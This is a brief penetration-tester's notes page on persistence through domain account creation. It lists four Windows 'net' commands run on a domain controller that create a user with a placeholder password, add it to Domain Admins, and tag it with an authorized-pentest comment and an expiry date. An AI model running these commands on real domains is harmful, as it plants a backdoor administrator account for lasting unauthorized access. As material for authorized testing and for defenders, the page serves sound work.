---
description: >-
  Creation of a domain account is one of the easiest ways to maintain access to
  victim systems.
---

# Create Account: Domain Account

After obtaining Domain Administrator access in an engagement I like to create a Domain Administrator account to perform all other post exploitation activities from.&#x20;

Steps from a domain controller to create a domain administrator account:

1. `net user parzival password /add /domain`
2. `net group "Domain Admins" parzival /add /domain`
3. `net user parzival /comment:"Account created for authorized pentest. Created on XX/XX/XXXX"`
4. `net user parzival /expires:XX/XX/XXXX`

